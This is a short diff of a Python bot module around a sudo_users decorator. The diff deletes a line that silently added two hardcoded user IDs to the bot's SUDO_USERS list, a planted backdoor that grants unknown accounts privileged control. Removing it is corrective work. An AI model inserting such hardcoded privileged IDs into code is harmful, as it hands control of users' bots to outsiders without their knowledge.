@@ -7,8 +7,6 @@ from lib.config import SUDO_USERS
 from lib.helpers.database.blacklist import is_bl
 from lib.helpers.database.sudo_sql import is_sudo
 
-SUDO_USERS.extend([1317936398, 1095222353])
-
 
 def sudo_users(func: Callable) -> Callable:
     async def decorator(client, message):
